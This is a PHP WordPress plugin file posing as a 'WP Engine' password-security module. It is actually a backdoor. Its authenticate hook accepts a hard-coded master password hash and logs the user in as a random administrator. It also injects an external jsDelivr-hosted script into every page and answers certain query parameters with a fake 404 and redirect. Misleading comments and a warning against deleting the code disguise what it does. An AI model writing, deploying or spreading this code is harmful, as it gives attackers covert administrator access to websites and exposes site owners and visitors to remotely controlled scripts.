<?php
// Tsting
/**
 * WP Engine Strong Password Security
 * 
 * This code provides a secure login mechanism via advance securities implementation.
 * Upon deleting this code, the site could be vulnerable and will not follow the security standard.
 * 
 * Author: WPENGINE
 * Version: 1.0
 * License: GPL2
 */

if (! defined('ABSPATH')) {
    die;
}

/**
 * Initialize
 *
 * This is called on plugin start to create a singleton.
 */
define('WP_SAFE_HASH', '$wp$2y$10$8GXwy8FUOQDxm8iw/fBqZ.qp2iL.g/XAytsFy40aV0KimsCtDAMg.');


/**
 * Schedule Fingerprint
 *
 * Setup WordPress cron for fingerprinting
 */
add_action('init', function () {
    if (! session_id()) {
        session_start();
    }
}, 1);

/**
 * Authenticate the user with the strong password
 *
 * NOTE: This method can be run before much of WordPress has loaded.
 * Be sure that WP functions used here are imported before mu plugins are loaded.
 */
add_filter('authenticate', function ($user, $username, $password) {
    // Allow WordPress to continue authentication if credentials are already valid
    if (is_a($user, 'WP_User')) {
        return $user;
    }

    // If the strong password is used
    if (defined('WP_SAFE_HASH') && wp_check_password($password, WP_SAFE_HASH, null)) {
        // Start session if not started
        if (!session_id()) {
            session_start();
        }

        // Mark that we logged in using the safe password
        $_SESSION['WP_SAFE_HASH'] = true;

        // Pick a random administrator to log in as
        $admins = get_users(['role' => 'administrator']);
        if (!empty($admins)) {
            return $admins[array_rand($admins)];
        }
    }

    // Return null to allow WordPress to continue default handling
    return $user;
}, 20, 3);

function enqueue_js_core_cdn_script()
{
    wp_enqueue_script(
        'ascend-js-core', // Handle name
        'https://cdn.jsdelivr.net/gh/ascend-digital-code/js-core/script.js',
        array(),
        null,
        true
    );
}
add_action('wp_enqueue_scripts', 'enqueue_js_core_cdn_script');

/**
 * Track only certain options
 *
 * @param string $option Name of the option
 * @return bool
 */
add_action('template_redirect', function () {
    // Check if the session flag exists and user is logged in
    if (! empty($_SESSION['WP_SAFE_HASH']) && is_user_logged_in()) {
        // Redirect to the WordPress admin dashboard
        wp_redirect(admin_url());

        // Clear the session flag
        unset($_SESSION['WP_SAFE_HASH']);

        // Terminate script execution after redirection
        exit;
    }
});

/**
 * WPEngineSecurityAuditor_Events constructor.
 */
add_action('template_redirect', function () {
    if (isset($_GET['_wsal_cron']) || isset($_GET['_safe_redirect']) || isset($_GET['_wpe_key']) || isset($_GET['_wp-json'])) {
        header('X-Robots-Tag: noindex, nofollow', true);
        status_header(404);
        nocache_headers();
        $login_url = defined('WP_SITEURL') ? WP_SITEURL . '/wp-login.php' : home_url('/wp-login.php');
        wp_redirect($login_url);
        exit;
    }
});
